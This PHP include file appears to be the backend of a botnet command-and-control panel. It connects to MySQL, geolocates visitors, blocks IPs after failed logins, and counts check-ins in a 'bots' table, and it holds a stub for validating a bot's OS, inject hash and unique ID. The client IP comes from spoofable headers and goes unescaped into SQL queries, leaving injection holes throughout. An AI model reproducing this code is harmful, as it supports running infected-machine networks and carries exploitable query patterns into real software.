<?php

		//error_reporting(0);
		set_time_limit (0);
		session_start();

		require_once( 'conf.php');
		require_once("inc/GeoIP/geoip.inc");
		require_once("plugins.php");
		
		if(!@connect_db()) exit ('unavailable server');
		
 $client_ip =  (empty($_SERVER['HTTP_CLIENT_IP'])?(empty($_SERVER['HTTP_X_FORWARDED_FOR'])?$_SERVER['REMOTE_ADDR']:$_SERVER['HTTP_X_FORWARDED_FOR']):$_SERVER['HTTP_CLIENT_IP']);

 
 if(strstr($client_ip, ',')) {
	 $ip = explode(',', $client_ip);
 	$client_ip = $ip[0];
 }
 


	if(!have_access($client_ip)){

		 exit ($_vars['msg_blacked_ip']);
		 
		}



	$time = time();
	$date = time();


	$gi = geoip_open("inc/GeoIP/GeoIP.dat",GEOIP_STANDARD);



////////FUNCTIONS



function ValidData($OS, $InjectHash, $UniqueId)
	{
	
	
	}
	


function LoggedUser()
	{
	
	if(isset($_SESSION['member_id']) && isset($_SESSION['access'])) return true; 
		return false;
	
	}


	function reloadIpList()
	{
	
	global $client_ip, $_vars, $time;
		
		$result = mysql_query("SELECT `per` FROM wrong_login WHERE ip='$client_ip'");
		if(mysql_num_rows($result)>0)  {
			$field = mysql_fetch_row($result);
			$new_per = $field[0]+1;
			mysql_query("UPDATE wrong_login SET `per`='$new_per' WHERE ip='$client_ip'");
		}
		else
		{			
			mysql_query("INSERT INTO wrong_login SET ip='$client_ip', `per`=1");
			$new_per = 1;
		}

		if($new_per>=$_vars['login_block_position']) 
			{
				setcookie(
  "block_mine",
  "true",
  time() + (10 * 365 * 24 * 60 * 60)
);

$country = CountryName($client_ip);
				mysql_query (" 	INSERT INTO blocked_ip SET ip='$client_ip', country='$country', added='$time'");
				mysql_query ("DELETE FROM wrong_login WHERE ip='$client_ip'");
				die('<script>window.location.replace="login.php"</script>'); 
			}
		
	}

	function connect_db()
	{
		global $db;

		if(!@mysql_connect(
		$db['localhost'], 
		$db['user'], 
		$db['pass'])) return false;

		if(!@mysql_select_db($db['db'])) return false;
		
				return true; ##all is ok
		
	}


	function have_access($addr){
	
	if(isset($_COOKIE['block_mine'])) return false;
	$result = mysql_query("SELECT * FROM blocked_ip  WHERE ip = '$addr'");
	if(mysql_num_rows($result)==1) 
		return false;
		 else 
		 	return true;
	
	}
	
	function ItsOnline($timestamp)
	{
		global $_vars;
		$par1 =  ($timestamp-$_vars['offline_time']);
		if($par1>time()) return true;
		return false;
	
	}



function checkIP($ip) {
	if(!preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/", $ip)) return false;
	return true;
}



function CountryName($IP){

	global $gi;

	$country= geoip_country_code_by_addr($gi, $IP) ;

	if (empty($country)) return 'Unk';

	return $country;
}


 function calculateTimeStamp($last_time)
										 {
			
										
										if($last_time=='today') 
										{
										$timestamp = strtotime('00:00:00');
										$timestamp2 = strtotime('23:59:59');
			
										$sql = "SELECT COUNT(*) FROM `bots` WHERE  knock_time>=$timestamp and knock_time<=$timestamp2";
										}
										else
										{							 
										$timestamp = strtotime('-' .$last_time);
			
										$sql = "SELECT COUNT(*) FROM `bots` WHERE  knock_time>=".$timestamp;
										}
										$sqlObj = mysql_query($sql);
										$sqlAss = mysql_fetch_row($sqlObj);
			
										return $sqlAss[0]; 
										}

?>